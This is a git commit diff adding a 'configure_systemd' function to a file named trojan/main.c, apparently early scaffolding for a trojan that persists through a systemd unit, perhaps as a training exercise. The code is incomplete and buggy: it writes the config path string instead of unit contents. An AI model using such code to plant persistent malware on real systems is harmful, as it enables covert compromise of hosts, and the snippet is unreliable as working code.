01569af420da2beb82594b6df36294f96ca03a20
winstonallo <arthurbiedchar@gmail.com>
2025-07-27 17:51:10 +0200

    Add configure_systemd to trojan/main.c

--- src/trojan/main.c
+++ src/trojan/main.c
@@ -1,5 +1,33 @@
+#include <errno.h>
+#include <fcntl.h>
 #include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include "shield.h"
+
+
+int configure_systemd() {
+    int fd = open(SYSTEMD_CONFIG_PATH, O_TRUNC | O_CREAT | O_WRONLY);
+    if (fd == -1) {
+        __log(stderr, "Could not open %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
+        return -1;
+    }
+
+    if (write(fd, SYSTEMD_CONFIG_PATH, sizeof(SYSTEMD_CONFIG_PATH)) != sizeof(SYSTEMD_CONFIG_PATH)) {
+        if (errno != 0) {
+            __log(stderr, "Error writing to %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
+        } else {
+            __log(stderr, "Unknow error opening %s\n", SYSTEMD_CONFIG_PATH);
+        }
+        close(fd);
+        return -1;
+    }
+
+    close(fd);
+    return 0;
+}
 
 int main() {
+    __log(stdout, "DEBUG=1\n");
     printf("abied-ch\n");
 }
